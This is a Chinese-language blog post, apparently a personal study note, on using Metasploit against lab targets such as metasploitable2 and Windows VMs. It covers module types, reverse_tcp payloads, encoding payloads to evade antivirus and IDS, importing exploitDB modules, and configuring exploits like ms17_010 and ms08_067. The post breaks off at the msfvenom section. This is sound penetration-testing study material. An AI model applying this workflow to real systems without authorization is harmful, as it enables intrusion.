<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="渗透测试," />










<meta name="description" content="上一次讲了漏洞扫描，这一次理所当然就是漏洞利用了学习过程中主要使用了metasploit作为主要工具靶机使用了metasploitable2和几个windows靶机分别是win7,win7spq,win service 2008 R2.由于笔者非常菜，所以还是记录一些基本的东西，以便不时温习。 Metasploit概述Metasploit是一个免费可下载的框架，可以用来发现漏洞，利用漏洞，提交漏洞">
<meta name="keywords" content="渗透测试">
<meta property="og:type" content="article">
<meta property="og:title" content="exploit">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;16&#x2F;exploit&#x2F;index.html">
<meta property="og:site_name" content="irrik&#39;s Blog">
<meta property="og:description" content="上一次讲了漏洞扫描，这一次理所当然就是漏洞利用了学习过程中主要使用了metasploit作为主要工具靶机使用了metasploitable2和几个windows靶机分别是win7,win7spq,win service 2008 R2.由于笔者非常菜，所以还是记录一些基本的东西，以便不时温习。 Metasploit概述Metasploit是一个免费可下载的框架，可以用来发现漏洞，利用漏洞，提交漏洞">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;CNBLPeuOn342pRJ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;GsbCavxkgRrJw7H.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;DLfpAYnBXKvWIUE.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;VEQGlCrsxJpOTfw.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;rPEGAoz2iCIjpO6.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;63gCOFDIQlcqHkp.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;qQPnFLkNV3d87mg.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;kvxD9fJmoNGCAa8.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;R7mVl8O6cQ9B4eG.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;cWDn6U87IeMi1KT.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;1FcgYDuwxSqivE6.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;gcOwARqV3fb9YBT.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;OXlfDK9CLFbsYrp.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;HSzTOAK5Dl4nqUv.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;Jqx5GURzh6cblIe.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;upYSrNdqkcwxGa3.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;K9nzXFqMixpwsfJ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;QYNpkhCnGjgJfcs.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;GBLYmWulbzhqZiM.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;cxA4GfFJkltbmSE.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;u4ylqNtKi9kOHeo.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;7MOciYoXTw9CDSH.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;7mtVFq8RwYu1npr.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;AtHUXbmjYPlEshL.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;OpJnf4tMzdwUksH.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;vuheSWB7Ltp8wgQ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;s8vin3NtSwzEOTx.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;PpdZMOacq9XTYsJ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;pfcQ8dHrje3lqm9.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;rjNCGsB4QigZxUO.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;17&#x2F;TvuHYZaFLobR2UA.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;jwoODklf5dPHiL7.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;mspqoQ4OXMwaWHI.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;KfnWToL7MhHUSIN.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;W2YK4iEc7Vjtm5B.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;JKp7EBY5hWUet9s.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;b7ZRdf4ArtjBGYS.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;qOGATZcUSKrupbM.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;DrV7tifbEw5Zosp.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;9NdOAPLrcKR4kVj.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;zaq4jDUxudMYF8i.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;SfbGmiHy3nz8lNQ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;P16jb7hm4HRgqSV.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;Pb4EUjVOcmyZXHg.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;YyO7pHFzDX8djIS.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;18&#x2F;DVoAU1fxb4RJ2va.png">
<meta property="og:updated_time" content="2020-03-12T05:42:34.487Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;02&#x2F;16&#x2F;CNBLPeuOn342pRJ.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/02/16/exploit/"/>





  <title>exploit | irrik's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">irrik's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">夏天要过去了</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/16/exploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="irrik">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="irrik's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">exploit</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-16T20:18:01+08:00">
                2020-02-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  4.7k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  16
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>上一次讲了漏洞扫描，这一次理所当然就是漏洞利用了<br>学习过程中主要使用了metasploit作为主要工具<br>靶机使用了metasploitable2和几个windows靶机分别是win7,win7spq,win service 2008 R2.<br>由于笔者非常菜，所以还是记录一些基本的东西，以便不时温习。</p>
<h1 id="Metasploit概述"><a href="#Metasploit概述" class="headerlink" title="Metasploit概述"></a>Metasploit概述</h1><p>Metasploit是一个免费可下载的框架，可以用来<strong>发现漏洞，利用漏洞，提交漏洞，并实施攻击</strong>。<br>Metasploit的强大之处在于它提供了大量的渗透测试模块和插件。这些模块安装不同的用途可以分为<strong>七种类型</strong>。<br>分别是Exploits(渗透攻击模块)，Auxiliary(辅助模块)，Post(后渗透攻击模块)，Payloads(攻击载荷模块)，Encoders(编码器模块)，Nops(空指令模块)，Evasion(规避模块)</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>渗透攻击模块主要利用发现的安全漏洞或者配置弱点进行攻击，以植入和运行攻击载荷。<strong>根据笔者自己使用的体会</strong>，Exploit模块是为Payload服务的。<br>使用Exploit是为了让payload得以运行，从而获得目标系统的访问控制权。渗透又可分为主动和被动渗透攻击两大类</p>
<h3 id="主动渗透攻击"><a href="#主动渗透攻击" class="headerlink" title="主动渗透攻击"></a>主动渗透攻击</h3><p>利用的安全安全漏洞位于网络服务端软件与服务端软件承载的上层应用程序之中。笔者理解为渗透目标开启了监听端口，可以通过这些端口存在的漏洞进行利用</p>
<h3 id="被动渗透攻击"><a href="#被动渗透攻击" class="headerlink" title="被动渗透攻击"></a>被动渗透攻击</h3><p>利用的漏洞位于客户端软件中(如浏览器，浏览器插件，电子邮件客户端，Office和adobe等各种文档与编辑软件)。笔者理解如下，目标机器不是服务器，不能主动攻击获取会话，<br>这时可以构造一些payload想办法传送给目标(网站的恶意文件，邮件传送等)，等待目标执行，然后在本地监听以获取目标系统shell会话</p>
<h2 id="Auxiliary"><a href="#Auxiliary" class="headerlink" title="Auxiliary"></a>Auxiliary</h2><p>辅助模块包括针对各种网络服务的扫描与检测，构建虚假服务，收集登录密码，口令猜测等模块。<strong>辅助模块还包括一些无需加载payload的模块，这些模块不用来取得目标系统远程控制权</strong></p>
<h2 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h2><p>后渗透攻击模块主要用于<strong>取得目标远程控制权之后的环节</strong>，实现在受控系统中进行各种各样的后渗透攻击动作，如获取敏感信息，进一步扩展，实施跳板攻击等。</p>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>攻击载荷模块，攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码。通常作用是为攻击者打开在目标系统上的控制会话连接。<br><strong>在传统的渗透代码开发中，payload只是一段简单的shellcode代码，以汇编语言编制并转换为目标系统cpu体系结构支持的机器代码。在渗透测试攻击触发漏洞后，将程序执行流程劫持并跳转入这段代码中执行，从而完成shellcode中的单一功能。</strong><br>Metasploit攻击载荷分为Single，stager(传输器)，Stage(传输体)三种类型</p>
<h3 id="Single"><a href="#Single" class="headerlink" title="Single"></a>Single</h3><p>(截止目前未使用)是一种完全独立的payload，使用起来就像运行calc.exe一样简单，如添加一个用户或删除一份文件。由于完全独立，因此有可能会被类似netcat这样的非Metasploit处理工具捕获</p>
<h3 id="Stager"><a href="#Stager" class="headerlink" title="Stager"></a>Stager</h3><p>这种payload负责建立目标用户和攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的stager payload就是reverse_tcp<strong>笔者本次实验几乎全程使用这种payload</strong>。<br>它可以让目标系统和攻击者建立一条TCP连接，让目标系统主动连接渗透测试者的端口(<strong>不易被发现</strong>)。另一种常见的是bind_tcp，它可以让目标系统开启一个TCP监视器，而攻击者可以随时与目标系统进行通信。</p>
<h3 id="Stage"><a href="#Stage" class="headerlink" title="Stage"></a>Stage</h3><p>一种payload组件，这种payload可以提供更加高级的功能，并且没有大小限制。</p>
<h2 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a>NOP</h2><p>空指令模块，空指令是一些对程序运行状态不会造成实质影响的空操作或无关操作指令。<br>在渗透攻击构造恶意数据缓冲区时，<strong>通常在真正要执行的shellcode前添加一段空指令区，保证跳转后有一个比较大的安全着陆区。</strong><br>从而避免受到内存地址随机化和返回地址计算偏差的影响。</p>
<h2 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h2><p>编码模块，对组装的空指令和payload指令序列进行编码。主要作用有两个。<br>一是确保payload中不会出现”坏字符”，二是对payload进行免杀处理。<br>即躲避反病毒软件，IDS入侵检测系统和IPS入侵防御系统的检测和拦截</p>
<h2 id="Evasion"><a href="#Evasion" class="headerlink" title="Evasion"></a>Evasion</h2><p>规避模块，这是在Metasploit5中新增的模块，使用来规避windows defender防火墙。</p>
<h2 id="Extension"><a href="#Extension" class="headerlink" title="Extension"></a>Extension</h2><p>插件能扩充框架的功能，或者封装已有功能构成高级功能的组件。插件可以用于集成现有的一些外部安全工具，如Nessus，Openvas漏洞扫描器等。</p>
<h1 id="Metasploit终端"><a href="#Metasploit终端" class="headerlink" title="Metasploit终端"></a>Metasploit终端</h1><p>在命令行中输入msfconsole即可启动<br><img src="https://i.loli.net/2020/02/16/CNBLPeuOn342pRJ.png" alt="Snipaste_2020-02-16_21-31-48.png"><br>从图中可以看到加载了1960个exploit模块，1094个auxiliary模块，336个post模块，562个payload模块和45个编码模块还有十个空指令模块和七个规避模块。</p>
<h2 id="初始化Metasploit"><a href="#初始化Metasploit" class="headerlink" title="初始化Metasploit"></a>初始化Metasploit</h2><p>在Kali linux中，Metasploit主要使用Postgresql数据库存储数据。<strong>所以在使用Metasploit框架时需要启动Postgresql数据库。</strong><br>执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure>
<p>启动数据库之后还需要使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfdb init</span><br></pre></td></tr></table></figure>
<p>来创建和初始化数据库。</p>
<h2 id="创建工作区"><a href="#创建工作区" class="headerlink" title="创建工作区"></a>创建工作区</h2><p><strong>为了区分不同的扫描任务，可以创建多个工作区。</strong><br>创建工作区的语法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workspace -a [name]</span><br></pre></td></tr></table></figure>
<p>其中-a表示添加工作区<br>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workspace</span><br></pre></td></tr></table></figure>
<p>查看当前工作区<br>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workspace [name]</span><br></pre></td></tr></table></figure>
<p>切换工作区<br><img src="https://i.loli.net/2020/02/16/GsbCavxkgRrJw7H.png" alt="Snipaste_2020-02-16_21-46-52.png"></p>
<h2 id="导入扫描报告"><a href="#导入扫描报告" class="headerlink" title="导入扫描报告"></a>导入扫描报告</h2><p>当用户准备好工作区后就可以执行渗透测试任务了，此时<strong>可以导入一些第三方扫描报告，来获取主机信息</strong>。<br>导入扫描报告的语法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_import &lt;filename&gt; [file2...]</span><br></pre></td></tr></table></figure>
<p>以上语法中filename表示导入的文件名。<br>这里以nessus生成的扫描报告为例<br>导入报告成功后，使用hosts查看报告的主机信息<br><img src="https://i.loli.net/2020/02/16/DLfpAYnBXKvWIUE.png" alt="Snipaste_2020-02-16_21-53-10.png"><br>使用vulns查看漏洞信息(这里只是一个例子报告中没有严重漏洞)<br><img src="https://i.loli.net/2020/02/16/VEQGlCrsxJpOTfw.png" alt="Snipaste_2020-02-16_21-54-28.png"><br><strong>接下来</strong>用户可以通过漏洞名称或者参考信息搜索可用的攻击载荷</p>
<h2 id="手动查找攻击载荷"><a href="#手动查找攻击载荷" class="headerlink" title="手动查找攻击载荷"></a>手动查找攻击载荷</h2><p>当用户确定目标系统中存在的漏洞后，可以在Metasploit中查找渗透测试模块。<br>以search命令手动查找为例(实际我也只用过search来找)。<br>查找渗透测试模块的语法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search [options] &lt;keywords&gt;</span><br></pre></td></tr></table></figure>
<p>以上语法中<br>options表示支持的选项；keyword表示可用的关键字。<br>一些支持的选项和含义如下</p>
<ol>
<li>-h: 显示帮助信息</li>
<li>-o <file>: 指定输出信息的保存文件，格式为CSV</li>
<li>-S <string>: 搜索指定的字符串</li>
<li>-u: 指定搜索模块<br>search命令支持的关键字及含义如下<br><img src="https://i.loli.net/2020/02/16/rPEGAoz2iCIjpO6.png" alt="Snipaste_2020-02-16_22-04-40.png"><br>以查找ms17_010为例<br><img src="https://i.loli.net/2020/02/16/63gCOFDIQlcqHkp.png" alt="Snipaste_2020-02-16_22-10-34.png"><br>可以看到有两个辅助模块三个渗透攻击模块<br>可以使用辅助模块来对目标进行扫描，看看目标是否易于攻击<br>如果目标易于攻击，就可以使用渗透攻击模块搭载payload进行攻击！<h2 id="第三方查找"><a href="#第三方查找" class="headerlink" title="第三方查找"></a>第三方查找</h2>如果用户在Metasploit没有查找到可用的exploit模块，还可以尝试在第三方查找。<br>Metasploit支持导入第三方模块并进行渗透测试。<h3 id="CVE-Details"><a href="#CVE-Details" class="headerlink" title="CVE Details"></a>CVE Details</h3><a href="https://www.cvedetails.com" target="_blank" rel="noopener">传送门</a><br>用户在此页面可以通过CVE ID,产品名，生产厂商或漏洞类型来搜索渗透测试模块。<br>以ms17_010为例<br><img src="https://i.loli.net/2020/02/16/qQPnFLkNV3d87mg.png" alt="Snipaste_2020-02-16_22-26-02.png"><br>根据搜索结果查看感兴趣的搜索结果，寻找可用渗透模块即可。<h3 id="exploitDB"><a href="#exploitDB" class="headerlink" title="exploitDB"></a>exploitDB</h3><a href="https://www.exploit-db.com" target="_blank" rel="noopener">传送门</a></li>
</ol>
<p><strong>注意由于某些众所周知的原因如果没有代理可能会访问这个网站失败</strong><br>在该界面输入攻击载荷的一些关键字，即可搜索到对应的渗透测试模块。在搜索时用户还可以选择verified和has app复选框<br><img src="https://i.loli.net/2020/02/16/kvxD9fJmoNGCAa8.png" alt="Snipaste_2020-02-16_22-45-29.png"><br>输出结果包括8列。<br>Date表示发布日期<br>D表示下载exploit<br>A表示可利用的应用程序<br>V表示已被验证<br>Title表示漏洞标题<br>Type表示类型<br>Platform表示平台<br>Author表示作者</p>
<h3 id="手动导入第三方模块"><a href="#手动导入第三方模块" class="headerlink" title="手动导入第三方模块"></a>手动导入第三方模块</h3><p>以exploitDB网站的模块为例<br><img src="https://i.loli.net/2020/02/16/R7mVl8O6cQ9B4eG.png" alt="Snipaste_2020-02-16_22-51-27.png"><br>下载并重命名为webtest.rb<br>将webtest.rb复制到Metasploit的模块位置。Metasploit模块的默认位置为<br>/root/.msf4/modules<br>为了方便区分模块，用户可根据模块类型创建不同的文件夹，比如本例是渗透攻击模块所以新建一个exploits文件夹。<br>为了方便管理可以再细分一个文件夹，这里在exploits下再新建一个test文件夹<br>最后将文件复制进来，如图<br><img src="https://i.loli.net/2020/02/16/cWDn6U87IeMi1KT.png" alt="Snipaste_2020-02-16_22-59-29.png"><br>重启msfconsole即可看到多增加了一个exploit模块。<br>选择刚才导入的模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/test/webtest.rb</span><br></pre></td></tr></table></figure>
<p>设置payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload name</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/16/1FcgYDuwxSqivE6.png" alt="Snipaste_2020-02-16_23-10-43.png"></p>
<p>查看选项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/16/gcOwARqV3fb9YBT.png" alt="Snipaste_2020-02-16_23-12-47.png"><br>选项四列分别代表含义如下<br>Name: 就是名称了<br>Current Setting: 当前设置<br>Required: 是否必须设置<br>Description: 描述<br>其中Required为yes为必须设置选项。<br>要设置某个选项使用一下语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set &lt;name&gt; setting</span><br></pre></td></tr></table></figure>
<p>比如设置RHOSTS：<br><img src="https://i.loli.net/2020/02/16/OXlfDK9CLFbsYrp.png" alt="Snipaste_2020-02-16_23-17-52.png"><br>可用看到在此查看选项时已经正确设置了RHOST</p>
<h2 id="攻击准备"><a href="#攻击准备" class="headerlink" title="攻击准备"></a>攻击准备</h2><p>找到了exploit后，还需要配置一下才可以开始进行渗透。<br>以webtest.rb为例讲一下如何准备一次攻击。<br><img src="https://i.loli.net/2020/02/17/HSzTOAK5Dl4nqUv.png" alt="Snipaste_2020-02-17_09-29-12.png"><br>设置payload之后，查看选项，发现RHOST必须填写，目前还没有填写，所以要set一下。<br><img src="https://i.loli.net/2020/02/17/Jqx5GURzh6cblIe.png" alt="Snipaste_2020-02-17_09-31-30.png"><br>set完成之后，再次show options,发现必须设置的选项已经设置完成，到这里其实已经可以开始渗透攻击了。</p>
<h3 id="设置构架"><a href="#设置构架" class="headerlink" title="设置构架"></a>设置构架</h3><p>但是举例就一次讲多点，下面讲一下<strong>设置架构的问题</strong><br>从上面这张图可以看到，exploit target处的Name选项值为Auto。<br>也就是根据攻击目标架构(会自动探测)自动选择。<br>如果用户<strong>是根据其他渠道获取目标主机的架构</strong>，也可以手动设置架构提高渗透效率。<br>以ms08_067为例<br>可以使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets</span><br></pre></td></tr></table></figure>
<p>来查看支持的攻击目标<br><img src="https://i.loli.net/2020/02/17/upYSrNdqkcwxGa3.png" alt="Snipaste_2020-02-17_09-37-24.png"><br>用户可以使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set target [id]</span><br></pre></td></tr></table></figure>
<p>来设置架构<br><img src="https://i.loli.net/2020/02/17/K9nzXFqMixpwsfJ.png" alt="Snipaste_2020-02-17_09-40-32.png"></p>
<h3 id="设置编码"><a href="#设置编码" class="headerlink" title="设置编码"></a>设置编码</h3><p>设置完架构之后，为了避免出现坏字符或者规避目标中防火墙或者杀毒软件的兰姐，可以为攻击载荷设置编码，从而生成新的攻击载荷。<br>编码模块主要供msfvenom使用。msfvenom是msf框架配套的攻击载荷生成器。<br>生成攻击载荷的语法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom [options] &lt;var=val&gt;</span><br></pre></td></tr></table></figure>
<p>该命令常用的选项及含义如下</p>
<ol>
<li>-p: 指定使用的payload</li>
<li>-e: 指定编码格式</li>
<li>-a: 指定系统架构，默认是x86</li>
<li>-s: 指定papyload的最大值</li>
<li>-i: 指定编码次数</li>
<li>-f: 指定生成的文件格式<br>查看所有可用编码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l encoder</span><br></pre></td></tr></table></figure>
